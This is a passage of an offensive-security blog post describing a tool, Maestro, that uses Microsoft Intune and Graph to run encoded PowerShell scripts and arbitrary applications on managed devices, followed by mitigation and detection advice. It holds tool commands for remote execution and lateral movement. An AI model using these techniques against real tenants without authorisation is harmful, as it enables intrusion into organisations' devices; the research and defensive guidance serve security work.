3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md pp c" width="700" height="383" loading="lazy" role="presentation"/></picture></div></div></figure><p id="5d18" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Script Execution</strong></p><p id="9e79" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">On another device, we’ll use PowerShell to encode a script we’d like to execute on the Intune device. We’ll just write a new file to the C drive for the purpose of this demonstration, but the world is your oyster here.</p><pre class="pj pk pl pm pn qi qg qj bp qk bb bk"><span id="53cd" class="ql nv gu qg b bg qm qn l qo qp"># Execute a script on the system<br/>$timestamp = Get-Date -Format &quot;yyyyMMdd_HHmmss&quot;;<br/>$script = &quot;New-Item -Path &#x27;C:\&#x27; -Name &quot;&quot;Maestro_Executed_$timestamp.txt&quot;&quot; -ItemType &quot;&quot;File&quot;&quot;&quot;;<br/>$bytes = [System.Text.Encoding]::UTF8.GetBytes($script);<br/>$encoded = [Convert]::ToBase64String($bytes);<br/>Write-Output $encoded</span></pre><p id="10dc" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Finally, we’ll execute the script on the target device then periodically check whether the script has executed and whether the first line of output is available, which is all that is made available by MS Graph. This can take a REALLY long time, especially after running multiple Intune scripts in a short time, but you can use the <code class="cx qd qe qf qg b">-t 0</code> option if you want to wait as long as it takes to recover the script’s output.</p><p id="2cb7" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><code class="cx qd qe qf qg b">.\Maestro.exe -d &lt;name&gt;.db exec intune script -i &lt;device_id&gt; -s &lt;base64_encoded_script&gt; -n &lt;script_name&gt; -t 0</code></p><figure class="pj pk pl pm pn po pg ph paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*NAmdfkv9smDPf4hk 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*NAmdfkv9smDPf4hk 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*NAmdfkv9smDPf4hk 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*NAmdfkv9smDPf4hk 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*NAmdfkv9smDPf4hk 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*NAmdfkv9smDPf4hk 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*NAmdfkv9smDPf4hk 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*NAmdfkv9smDPf4hk 640w, https://miro.medium.com/v2/resize:fit:720/0*NAmdfkv9smDPf4hk 720w, https://miro.medium.com/v2/resize:fit:750/0*NAmdfkv9smDPf4hk 750w, https://miro.medium.com/v2/resize:fit:786/0*NAmdfkv9smDPf4hk 786w, https://miro.medium.com/v2/resize:fit:828/0*NAmdfkv9smDPf4hk 828w, https://miro.medium.com/v2/resize:fit:1100/0*NAmdfkv9smDPf4hk 1100w, https://miro.medium.com/v2/resize:fit:1400/0*NAmdfkv9smDPf4hk 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md pp c" width="700" height="383" loading="lazy" role="presentation"/></picture></div></div></figure><figure class="pj pk pl pm pn po pg ph paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*Bgkm4Mv2aqqLzDda 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*Bgkm4Mv2aqqLzDda 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*Bgkm4Mv2aqqLzDda 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*Bgkm4Mv2aqqLzDda 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*Bgkm4Mv2aqqLzDda 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*Bgkm4Mv2aqqLzDda 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Bgkm4Mv2aqqLzDda 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*Bgkm4Mv2aqqLzDda 640w, https://miro.medium.com/v2/resize:fit:720/0*Bgkm4Mv2aqqLzDda 720w, https://miro.medium.com/v2/resize:fit:750/0*Bgkm4Mv2aqqLzDda 750w, https://miro.medium.com/v2/resize:fit:786/0*Bgkm4Mv2aqqLzDda 786w, https://miro.medium.com/v2/resize:fit:828/0*Bgkm4Mv2aqqLzDda 828w, https://miro.medium.com/v2/resize:fit:1100/0*Bgkm4Mv2aqqLzDda 1100w, https://miro.medium.com/v2/resize:fit:1400/0*Bgkm4Mv2aqqLzDda 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md pp c" width="700" height="383" loading="lazy" role="presentation"/></picture></div></div></figure><p id="50dd" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">If you don’t want to hang your C2 agent or if your access token expires before the script output is available, you can request output manually as well.</p><p id="58e1" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><code class="cx qd qe qf qg b">.\Maestro.exe -d &lt;name&gt;.db get intune script-output -i &lt;script_id&gt; — device &lt;device_id&gt;</code></p><figure class="pj pk pl pm pn po pg ph paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*xUkzQswxjW3Ha9lx 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*xUkzQswxjW3Ha9lx 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*xUkzQswxjW3Ha9lx 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*xUkzQswxjW3Ha9lx 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*xUkzQswxjW3Ha9lx 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*xUkzQswxjW3Ha9lx 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*xUkzQswxjW3Ha9lx 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*xUkzQswxjW3Ha9lx 640w, https://miro.medium.com/v2/resize:fit:720/0*xUkzQswxjW3Ha9lx 720w, https://miro.medium.com/v2/resize:fit:750/0*xUkzQswxjW3Ha9lx 750w, https://miro.medium.com/v2/resize:fit:786/0*xUkzQswxjW3Ha9lx 786w, https://miro.medium.com/v2/resize:fit:828/0*xUkzQswxjW3Ha9lx 828w, https://miro.medium.com/v2/resize:fit:1100/0*xUkzQswxjW3Ha9lx 1100w, https://miro.medium.com/v2/resize:fit:1400/0*xUkzQswxjW3Ha9lx 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md pp c" width="700" height="383" loading="lazy" role="presentation"/></picture></div></div></figure><p id="feff" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Unfortunately, at the time of this writing, there is no <code class="cx qd qe qf qg b">FileContent</code> device query action, so we can’t read the full contents of arbitrary files from remote devices with device query yet. You’ll have to get creative with script/application execution to accomplish that.</p><p id="d4b3" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Application Execution</strong></p><p id="4af3" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">To execute an arbitrary application on an Intune device, simply point Maestro to the UNC path of the executable and either specify an Intune device ID, Entra device ID, or the ID of an existing Entra group containing the ID of the machine to execute the app on. If a device ID is specified, Maestro will automatically locate the device in both Intune and Entra and add it to a new Entra group before executing the application.</p><p id="6c76" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><code class="cx qd qe qf qg b">.\Maestro.exe -d &lt;name&gt;.db exec intune app -p &lt;unc_path&gt; -i &lt;device_id&gt;</code></p><figure class="pj pk pl pm pn po pg ph paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*3XtJlSpoVDpVxMJT 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*3XtJlSpoVDpVxMJT 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*3XtJlSpoVDpVxMJT 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*3XtJlSpoVDpVxMJT 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*3XtJlSpoVDpVxMJT 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*3XtJlSpoVDpVxMJT 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*3XtJlSpoVDpVxMJT 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*3XtJlSpoVDpVxMJT 640w, https://miro.medium.com/v2/resize:fit:720/0*3XtJlSpoVDpVxMJT 720w, https://miro.medium.com/v2/resize:fit:750/0*3XtJlSpoVDpVxMJT 750w, https://miro.medium.com/v2/resize:fit:786/0*3XtJlSpoVDpVxMJT 786w, https://miro.medium.com/v2/resize:fit:828/0*3XtJlSpoVDpVxMJT 828w, https://miro.medium.com/v2/resize:fit:1100/0*3XtJlSpoVDpVxMJT 1100w, https://miro.medium.com/v2/resize:fit:1400/0*3XtJlSpoVDpVxMJT 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md pp c" width="700" height="383" loading="lazy" role="presentation"/></picture></div></div></figure><p id="8c16" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Maestro will attempt to force the device to sync with Intune to fetch applications pending installation via its persistent notification channel, but this fails pretty often because Microsoft severely throttles the number of sync actions a device can make in a short amount of time. In this case, you can use the <code class="cx qd qe qf qg b">exec intune sync</code> command to try again or wait until the device’s next naturally occurring check-in (every eight hours or after rebooting by default).</p><figure class="pj pk pl pm pn po pg ph paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*S3BJe3X0QlUJlkGB 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*S3BJe3X0QlUJlkGB 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*S3BJe3X0QlUJlkGB 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*S3BJe3X0QlUJlkGB 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*S3BJe3X0QlUJlkGB 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*S3BJe3X0QlUJlkGB 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*S3BJe3X0QlUJlkGB 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*S3BJe3X0QlUJlkGB 640w, https://miro.medium.com/v2/resize:fit:720/0*S3BJe3X0QlUJlkGB 720w, https://miro.medium.com/v2/resize:fit:750/0*S3BJe3X0QlUJlkGB 750w, https://miro.medium.com/v2/resize:fit:786/0*S3BJe3X0QlUJlkGB 786w, https://miro.medium.com/v2/resize:fit:828/0*S3BJe3X0QlUJlkGB 828w, https://miro.medium.com/v2/resize:fit:1100/0*S3BJe3X0QlUJlkGB 1100w, https://miro.medium.com/v2/resize:fit:1400/0*S3BJe3X0QlUJlkGB 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md pp c" width="700" height="305" loading="lazy" role="presentation"/></picture></div></div></figure><p id="ef24" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Maestro does not clean up the new app and Entra group automatically because of this uncertain execution window, but the commands needed to execute cleanup manually are displayed to the user.</p><p id="6603" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Eventually (the only unit of time Intune supports 🥲), you should see the results of your application execution.</p><h1 id="4289" class="nu nv gu bf nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or bk">Using the Database</h1><p id="a6ba" class="pw-post-body-paragraph mw mx gu my b mz os nb nc nd ot nf ng nh ou nj nk nl ov nn no np ow nr ns nt gn bk">Right now, the best way to review the contents of the database file is by opening it in LiteDB, where you can review previously queried objects and credentials obtained from Azure.</p><figure class="pj pk pl pm pn po pg ph paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*fJnwZqp3rxDjZygt 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*fJnwZqp3rxDjZygt 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*fJnwZqp3rxDjZygt 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*fJnwZqp3rxDjZygt 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*fJnwZqp3rxDjZygt 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*fJnwZqp3rxDjZygt 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*fJnwZqp3rxDjZygt 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*fJnwZqp3rxDjZygt 640w, https://miro.medium.com/v2/resize:fit:720/0*fJnwZqp3rxDjZygt 720w, https://miro.medium.com/v2/resize:fit:750/0*fJnwZqp3rxDjZygt 750w, https://miro.medium.com/v2/resize:fit:786/0*fJnwZqp3rxDjZygt 786w, https://miro.medium.com/v2/resize:fit:828/0*fJnwZqp3rxDjZygt 828w, https://miro.medium.com/v2/resize:fit:1100/0*fJnwZqp3rxDjZygt 1100w, https://miro.medium.com/v2/resize:fit:1400/0*fJnwZqp3rxDjZygt 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md pp c" width="700" height="349" loading="lazy" role="presentation"/></picture></div></div></figure><h1 id="b72a" class="nu nv gu bf nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or bk">What’s next for Maestro?</h1><ul class=""><li id="893e" class="mw mx gu my b mz os nb nc nd ot nf ng nh ou nj nk nl ov nn no np ow nr ns nt ox oy oz bk">More flexible token manipulation and storage</li><li id="1217" class="mw mx gu my b mz pb nb nc nd pc nf ng nh pd nj nk nl pe nn no np pf nr ns nt ox oy oz bk">Additional methods of execution</li><li id="6141" class="mw mx gu my b mz pb nb nc nd pc nf ng nh pd nj nk nl pe nn no np pf nr ns nt ox oy oz bk">Credential gathering via Intune (Cloud LAPS)</li><li id="bc7b" class="mw mx gu my b mz pb nb nc nd pc nf ng nh pd nj nk nl pe nn no np pf nr ns nt ox oy oz bk">Azure Arc support</li><li id="6932" class="mw mx gu my b mz pb nb nc nd pc nf ng nh pd nj nk nl pe nn no np pf nr ns nt ox oy oz bk">Command line options for items in the database</li><li id="2e82" class="mw mx gu my b mz pb nb nc nd pc nf ng nh pd nj nk nl pe nn no np pf nr ns nt ox oy oz bk">More enumeration techniques with Entra and Resource Graph</li></ul><h1 id="66a5" class="nu nv gu bf nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or bk">Defensive Guidance</h1><h2 id="9569" class="qq nv gu bf nw qr qs dy oa qt qu ea oe nh qv qw qx nl qy qz ra np rb rc rd re bk"><strong class="al">Mitigation</strong></h2><p id="21e8" class="pw-post-body-paragraph mw mx gu my b mz os nb nc nd ot nf ng nh ou nj nk nl ov nn no np ow nr ns nt gn bk">If conditional access policies or security defaults require MFA for access to Azure admin portals and other applications that allow execution of administrative actions using Microsoft Graph, and the administrator is not logged into the device with Windows Hello for Business, MFA will prevent this particular attack because the PRT for that device/user combo will not have an MFA claim to satisfy the policy.</p><h2 id="fae6" class="qq nv gu bf nw qr qs dy oa qt qu ea oe nh qv qw qx nl qy qz ra np rb rc rd re bk"><strong class="al">Detection</strong></h2><p id="dd4d" class="pw-post-body-paragraph mw mx gu my b mz os nb nc nd ot nf ng nh ou nj nk nl ov nn no np ow nr ns nt gn bk"><a class="af pa" href="https://x.com/h4wkst3r/status/1831366969079296097" rel="noopener ugc nofollow" target="_blank">Brett Hawkins</a> at IBM X-Force Red recently wrote an excellent, very detailed <a class="af pa" href="https://securityintelligence.com/x-force/detecting-intune-lateral-movement/" rel="noopener ugc nofollow" target="_blank">blog post about detecting Intune lateral movement techniques</a> and provided <a class="af pa" href="https://github.com/h4wkst3r/KQL-Queries/tree/main/MicrosoftIntune" rel="noopener ugc nofollow" target="_blank">Sentinel-ready KQL queries</a> that can be used to alert upon suspicious Intune script and application execution. There are lots of events of interest generated from this attack path that the KQL queries can be modified to support.</p><figure class="pj pk pl pm pn po pg ph paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph rf"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*r0y6mGyl4690yHAG 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*r0y6mGyl4690yHAG 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*r0y6mGyl4690yHAG 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*r0y6mGyl4690yHAG 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*r0y6mGyl4690yHAG 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*r0y6mGyl4690yHAG 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*r0y6mGyl4690yHAG 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*r0y6mGyl4690yHAG 640w, https://miro.medium.com/v2/resize:fit:720/0*r0y6mGyl4690yHAG 720w, https://miro.medium.com/v2/resize:fit:750/0*r0y6mGyl4690yHAG 750w, https://miro.medium.com/v2/resize:fit:786/0*r0y6mGyl4690yHAG 786w, https://miro.medium.com/v2/resize:fit:828/0*r0y6mGyl4690yHAG 828w, https://miro.medium.com/v2/resize:fit:1100/0*r0y6mGyl4690yHAG 1100w, https://miro.medium.com/v2/resize:fit:1400/0*r0y6mGyl4690yHAG 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md pp c" width="700" height="264" loading="lazy" role="presentation"/></picture></div></div></figure><p id="2239" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">When creating detections, keep in mind that the attacker can control the information that Maestro and similar tools send to Microsoft Graph in HTTP requests (e.g., User Agent, time between requests, etc.). If possible, baseline your Intune admins’ legitimate activities and alert upon suspicious usage of these features. For example, if Intune apps are deleted very rarely in your organization or are typically created several days before they are assigned, those events might be indicators of compromise.</p><h1 id="4405" class="nu nv gu bf nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or bk">Have questions or want to collaborate on new functionality or research?</h1><p id="0ab6" class="pw-post-body-paragraph mw mx gu my b mz os nb nc nd ot nf ng nh ou nj nk nl ov nn no np ow nr ns nt gn bk">Hit me up on Twitter (<a class="af pa" href="https://x.com/_Mayyhem" rel="noopener ugc nofollow" target="_blank">@_Mayyhem</a>) or in the <a class="af pa" href="https://ghst.ly/BHSlack" rel="noopener ugc nofollow" target="_blank">BloodHound Slack</a>!</p></div></div></div></div></section></div></div></article></div><div class="l"></div><footer class="rg rh ri rj rk ab q rl ik c"><div class="l ae"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab cp rm"><div class="ab q kv"><div class="rn l"><span class="l ro rp rq e d"><div class="ab q kv kw"><div class="pw-multi-vote-icon fj je kx ky kz"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fspecter-ops-posts%2F9ed71d38d546&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fmaestro-9ed71d38d546&amp;user=Chris+Thompson&amp;userId=1cf7ed8b7054&amp;source=---footer_actions--9ed71d38d546---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="la ao lb lc ld le am lf lg lh kz"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 